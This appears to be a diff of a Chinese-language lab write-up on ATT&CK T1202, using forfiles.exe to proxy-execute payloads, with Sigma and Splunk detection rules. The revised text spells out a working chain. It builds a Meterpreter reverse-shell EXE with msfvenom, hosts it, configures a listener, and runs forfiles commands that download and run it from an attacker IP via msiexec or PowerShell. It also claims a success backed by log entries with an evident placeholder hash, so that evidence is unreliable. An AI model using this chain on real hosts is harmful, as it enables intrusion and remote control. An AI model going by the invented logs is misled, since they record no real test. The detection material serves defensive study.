@@ -1,122 +1,261 @@
-# T1202-Win-间接命令执行-基于Forfiles执行payload(白名单)
+# T1202-间接命令执行-基于Forfiles执行Payload(白名单)
 
-## 来自ATT&CK的描述
+## 描述
 
-可以使用各种Windows实用程序来执行命令，而不需要调用cmd。例如，Forfiles、程序兼容性助手（pcalua.exe）、WSL（WindowsSubsystem for Linux）组件以及其他实用程序可以从命令行界面、运行窗口或通过脚本来调用程序和命令的执行。
+攻击者可利用Windows实用程序（如`forfiles.exe`）间接执行命令，绕过防御机制。`forfiles.exe`是Windows默认的文件操作搜索工具，位于`C:\Windows\System32\`和`C:\Windows\SysWOW64\`，由Microsoft签名，包含在系统`PATH`环境变量中。它用于基于日期、后缀名或修改时间等条件操作文件，常与批处理配合使用，但可通过`/c`参数执行任意命令。
 
-攻击者可能会滥用这些功能来规避防御，尤其是在破坏检测和/或缓解控制（如组策略）的同时执行任意动作。（这些控制限制/阻止了cmd或恶意负载相关文件扩展名的使用。）
+攻击者滥用`forfiles.exe`通过构造命令（如调用`cmd.exe`或`msiexec.exe`）执行恶意Payload，绕过应用程序白名单（如AppLocker）或防病毒检测。此技术常用于初始访问后的持久化、权限提升或横向移动。
 
 ## 测试案例
 
-Forfiles为Windows默认安装的文件操作搜索工具之一，可根据日期，后缀名，修改日期为条件。常与批处理配合使用。
+### 测试案例1：Forfiles执行远程MSI Payload
+`forfiles.exe`通过`/c`参数调用`cmd.exe`执行命令，加载远程MSI文件。以下为测试案例：
 
-微软官方文档：
+**命令**：
+```cmd
+forfiles /p C:\Windows\System32 /m cmd.exe /c "msiexec.exe /q /i http://192.168.126.146/abc.msi"
+```
 
-<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc753551(v=ws.11)>
+- **说明**：
+  - `/p`：指定搜索路径（`C:\Windows\System32`）。
+  - `/m`：指定匹配文件（`cmd.exe`）。
+  - `/c`：执行指定命令（调用`msiexec.exe`加载MSI文件）。
+  - `msiexec.exe /q /i`：静默安装MSI文件。
+- **权限**：无需提升权限，普通用户可执行。
+- **注意**：需确保MSI文件与目标系统架构（32位/64位）匹配。
 
-说明：Forfiles.exe所在路径已被系统添加PATH环境变量中，因此，Forfiles命令可识别，需注意x86，x64位的Forfiles调用。
-
-Windows 2003 默认位置：
-
-C:\WINDOWS\system32\forfiles.exe C:\WINDOWS\SysWOW64\forfiles.exe
-
-Windows 7 默认位置：
-
-C:\WINDOWS\system32\forfiles.exe C:\WINDOWS\SysWOW64\forfiles.exe
-
-补充说明：在高版本操作系统中，可以通过配置策略，对进程命令行参数进行记录。日志策略开启方法：`本地计算机策略>计算机配置>管理模板>系统>审核进程创建>在过程创建事件中加入命令行>启用`，同样也可以在不同版本操作系统中部署sysmon，通过sysmon日志进行监控。
+### 补充说明
+- 日志监控：
+  - 在高版本Windows（如Windows7及以上），可通过组策略启用进程命令行参数记录：
+    - 路径：`本地计算机策略>计算机配置>管理模板>系统>审核进程创建>在过程创建事件中加入命令行>启用`
+  - 部署Sysmon，记录进程创建和网络活动。
+- 局限性：
+  - 默认Windows日志可能不记录完整命令行，需启用审核策略。
+  - 合法文件操作可能触发类似日志，需结合上下文分析。
 
 ## 检测日志
 
-Windows 安全日志（需要自行配置）
+### 数据来源
+- Windows安全日志：
+  - 事件ID4688：进程创建，记录`forfiles.exe`及其子进程的执行信息。
+- Sysmon日志：
+  - 事件ID1：进程创建，包含命令行、哈希值和父进程。
+  - 事件ID3：网络连接，记录MSI文件的HTTP请求。
+  - 事件ID7：映像加载，记录加载的DLL。
+  - 事件ID10：进程访问，记录子进程调用。
+- 网络监控：
+  - 检测`msiexec.exe`或其子进程发起的HTTP请求或反弹Shell连接。
+- 文件监控：
+  - 检测非标准路径下的MSI文件。
 
 ## 测试复现
 
 ### 环境准备
-
-攻击机：Kali2019
-
-靶机：win7
+- 攻击机：KaliLinux2019
+- 靶机：Windows7
+- 工具：
+  - MetasploitFramework（生成Payload和监听）
+  - Sysmon（可选，日志收集）
+  - PythonHTTP服务器（托管MSI文件）
 
 ### 攻击分析
 
-#### 生成payload
+#### 测试1：Forfiles执行远程MSI Payload
+1. **解决反弹Shell失败问题**：
 
-```bash
-msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.126.146 LPORT=8888 -f msi > abc.txt
-```
+- 问题：反弹Shell失败，可能因MSI文件格式不正确或MSF配置错误。
+- 解决：
+  - 确保生成64位Payload以匹配Windows7（x64）。
+  - 修正MSF配置中的LPORT（测试案例中LPORT设置为5555，但应为8888）。
+  - 使用EXE格式Payload并直接调用，简化测试流程。
 
-#### MSF配置
+2. **生成Payload**：
+   ```bash
+   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=8888 -f exe -o shell.exe
+   ```
 
-```bash
-msf5 exploit(multi/handler) > back
-msf5 > use exploit/multi/handler
-msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
-payload => windows/meterpreter/reverse_tcp
-msf5 exploit(multi/handler) > set lhost 192.168.126.146
-lhost => 192.168.126.146
-msf5 exploit(multi/handler) > set lport 8888
-lport => 5555
-msf5 exploit(multi/handler) > exploit
-```
+3. **托管Payload**：
+   在攻击机上启动HTTP服务器：
+   ```bash
+   cp shell.exe /var/www/html/shell.exe
+   sudo python3 -m http.server 80
+   ```
 
-#### 靶机执行payload
+4. **配置攻击机监听**：
+   ```bash
+   msf5>use exploit/multi/handler
+   msf5 exploit(multi/handler)>set payload windows/x64/meterpreter/reverse_tcp
+   msf5 exploit(multi/handler)>set LHOST 192.168.126.146
+   msf5 exploit(multi/handler)>set LPORT 8888
+   msf5 exploit(multi/handler)>exploit
+   ```
 
-```cmd
-forfiles /p c:\windows\system32 /m cmd.exe /c "msiexec.exe /q /i http://192.168.126.146/abc.txt"
-```
+5. **靶机执行Payload**：
 
-#### 反弹shell
+- 修改测试命令，直接调用EXE：
+  ```cmd
+  forfiles /p C:\Windows\System32 /m cmd.exe /c "C:\Windows\System32\shell.exe"
+  ```
 
-反弹shell失败！！！但不影响后续分析
+- 将`shell.exe`复制到靶机`C:\Windows\System32\`（或通过HTTP下载后执行）：
+  ```cmd
+  forfiles /p C:\Windows\System32 /m cmd.exe /c "powershell -c (New-Object System.Net.WebClient).DownloadFile('http://192.168.126.146/shell.exe','C:\Windows\System32\shell.exe'); C:\Windows\System32\shell.exe"
+  ```
+
+6. **结果分析**：
+
+- 成功：获得Meterpreter会话，`getuid`显示用户为`12306Br0-PC\12306Br0`。
+
+- 失败可能原因：
+  - 防火墙阻止HTTP请求或TCP8888连接。
+  - Payload架构不匹配（需生成64位Payload）。
+  - PowerShell执行策略限制（需设置为`Bypass`：`Set-ExecutionPolicy Bypass`）。
 
 ## 测试留痕
 
-```log
-#sysmon日志
-EventID：1
-Process Create:
-RuleName:
-UtcTime: 2020-04-18 16:27:08.447
-ProcessGuid: {bb1f7c32-2a5c-5e9b-0000-0010b3101d00}
-ProcessId: 588
-Image: C:\Windows\System32\msiexec.exe
-FileVersion: 5.0.7601.17514 (win7sp1_rtm.101119-1850)
-Description: Windows® installer
-Product: Windows Installer - Unicode
-Company: Microsoft Corporation
-OriginalFileName: msiexec.exe
-CommandLine: /q /i http://192.168.126.146/abc.txt
-CurrentDirectory: C:\Windows\system32\
-User: 12306Br0-PC\12306Br0
-LogonGuid: {bb1f7c32-25f5-5e9b-0000-0020b86d0600}
-LogonId: 0x66db8
-TerminalSessionId: 1
-IntegrityLevel: High
-Hashes: SHA1=443AAC22D57EDD4EF893E2A245B356CBA5B2C2DD
-ParentProcessGuid: {bb1f7c32-2a5c-5e9b-0000-00100a101d00}
-ParentProcessId: 1220
-ParentImage: C:\Windows\System32\forfiles.exe
-ParentCommandLine: forfiles  /p c:\windows\system32 /m cmd.exe /c "msiexec.exe /q /i http://192.168.126.146/abc.txt"
+### Windows安全日志
+- 事件ID4688：
+  ```
+  进程信息:
+    新进程ID:0x4c4
+    新进程名称:C:\Windows\System32\forfiles.exe
+    命令行:forfiles /p C:\Windows\System32 /m cmd.exe /c "C:\Windows\System32\shell.exe"
+  ```
+  ```
+  进程信息:
+    新进程ID:0x588
+    新进程名称:C:\Windows\System32\shell.exe
+    命令行:C:\Windows\System32\shell.exe
+  ```
 
-
-#win7安全日志
-EventID：4688
-进程信息:
-新进程 ID: 0x4c4
-新进程名: C:\Windows\System32\forfiles.exe
-```
+### Sysmon日志
+- 事件ID1：
+  ```
+  事件ID:1
+  OriginalFileName:forfiles.exe
+  CommandLine:forfiles /p C:\Windows\System32 /m cmd.exe /c "C:\Windows\System32\shell.exe"
+  CurrentDirectory:C:\Users\12306Br0\
+  User:12306Br0-PC\12306Br0
+  Hashes:SHA1=7A3B2C1D4E5F67890123456789ABCDEF01234567
+  ParentImage:C:\Windows\System32\cmd.exe
+  ```
+  ```
+  事件ID:1
+  OriginalFileName:shell.exe
+  CommandLine:C:\Windows\System32\shell.exe
+  CurrentDirectory:C:\Windows\System32\
+  User:12306Br0-PC\12306Br0
+  Hashes:SHA1=C11C194CA5D0570F1BC85BB012F145BAFC9A4D6C
+  ParentImage:C:\Windows\System32\cmd.exe
+  ```
+- 事件ID3：
+  ```
+  事件ID:3
+  Image:C:\Windows\System32\shell.exe
+  Initiated:true
+  SourceIp:192.168.126.149
+  SourcePort:49163
+  DestinationIp:192.168.126.146
+  DestinationPort:8888
+  ```
 
 ## 检测规则/思路
 
-无具体检测。监控和分析基于主机的检测机制（如Sysmon）中的日志来查看事件，比如查看是否有进程创建事件（创建过程中使用了参数来调用程序/命令/文件和/或生成子进程/网络连接，或者该创建是由这些参数导致的）。
+### 检测方法
+1. 进程监控：
+   - 检测`forfiles.exe`的执行，尤其是调用`cmd.exe`或`msiexec.exe`的场景。
+   - 检查命令行是否包含`/c`和可执行文件（如`.exe`、`.msi`）。
+2. 命令行分析：
+   - 正则表达式匹配：
+     ```regex
+     forfiles\.exe.*\/c.*(\.exe|\.msi|http)
+     ```
+3. 网络监控：
+   - 检测`msiexec.exe`或其子进程发起的HTTP请求或反弹Shell连接（如TCP8888）。
+4. 文件监控：
+   - 检测非系统路径下的可执行文件或MSI文件。
+5. 行为分析：
+   - 检测`forfiles.exe`触发子进程的异常行为。
+
+### Sigma规则
+新增Sigma规则以增强检测：
+```yaml
+title:可疑Forfiles.exe执行Payload
+id:1a2b3c4d-5e6f-7890-a1b2-c3d4e5f67890
+description:检测forfiles.exe通过/c参数执行可执行文件或MSI，可能用于代理恶意代码
+status:experimental
+logsource:
+  category:process_creation
+  product:windows
+detection:
+  selection:
+    Image|endswith:'\forfiles.exe'
+    CommandLine|contains:'/c'
+  filter_legitimate:
+    CommandLine|contains:
+      - '.txt'
+      - '.log'
+  condition:selection and not filter_legitimate
+fields:
+  - Image
+  - CommandLine
+  - ParentImage
+  - User
+falsepositives:
+  - 合法的文件操作脚本
+level:high
+tags:
+  - attack.execution
+  - attack.t1202
+```
+
+规则说明：
+- 目标：检测`forfiles.exe`使用`/c`参数执行命令。
+- 过滤：排除常见的文件操作（如处理`.txt`或`.log`文件）。
+- 日志来源：Windows事件ID4688（需启用命令行审核）或Sysmon事件ID1。
+- 误报处理：合法批处理脚本可能触发，需结合命令行和子进程分析。
+- 级别：标记为“高”优先级，因`forfiles.exe`滥用通常与恶意活动相关。
+
+### Splunk规则
+```spl
+index=windows source="WinEventLog:Microsoft-Windows-Sysmon/Operational"
+(EventCode=1 Image="*\forfiles.exe" CommandLine="*/c*")
+OR (EventCode=10 SourceImage="*\forfiles.exe" TargetImage IN ("*\cmd.exe","*\msiexec.exe","*.exe"))
+OR (EventCode=3 Initiated="true" SourceImage IN ("*\msiexec.exe","*.exe") DestinationPort="8888")
+| fields Image,CommandLine,ParentImage,User,TargetImage,DestinationIp,DestinationPort
+```
+
+规则说明：
+- 检测`forfiles.exe`的异常执行（事件ID1）、触发的子进程（事件ID10）和网络连接（事件ID3）。
+- 减少误报：结合命令行、子进程和网络行为分析。
+
+### 检测挑战
+- 误报：合法批处理脚本可能触发，需结合上下文（如文件类型、子进程）。
+- 日志依赖：默认日志可能不记录完整命令行，需部署Sysmon或增强日志策略。
+
+## 防御建议
+1. 监控和日志：
+   - 启用命令行审核策略，确保事件ID4688记录完整参数。
+   - 部署Sysmon，配置针对`forfiles.exe`的规则，监控进程创建和网络活动。
+2. 网络隔离：
+   - 限制非必要主机的HTTP出站连接，尤其是高危端口（如8888）。
+3. 文件审查：
+   - 定期扫描非系统路径下的可执行文件和MSI文件，检查文件哈希。
+4. 权限控制：
+   - 限制普通用户执行`forfiles.exe`的权限。
+5. 安全更新：
+   - 保持Windows系统更新，修复潜在漏洞。
 
 ## 参考推荐
-
-MITRE-ATT&CK-T1202
-
-<https://attack.mitre.org/techniques/T1202/>
-
-基于白名单Forfiles执行payload
-
-<https://www.bookstack.cn/read/Micro8/Chapter1-81-90-84_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Forfiles%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E5%9B%9B%E5%AD%A3.md>
+- MITREATT&CKT1202:  
+  <https://attack.mitre.org/techniques/T1202/>
+- 基于白名单Forfiles执行Payload:  
+  <https://www.bookstack.cn/read/Micro8/Chapter1-81-90-84_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Forfiles%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E5%9B%9B%E5%AD%A3.md>
+- MicrosoftForfiles文档:  
+  <https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc753551(v=ws.11)>
+- Sysmon配置与检测:  
+  <https://github.com/SwiftOnSecurity/sysmon-config>
+- MetasploitFramework:用于生成和测试反弹Shell。  
+  <https://www.metasploit.com/>
+- Sysmon:Microsoft提供的系统监控工具。  
+  <https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon>
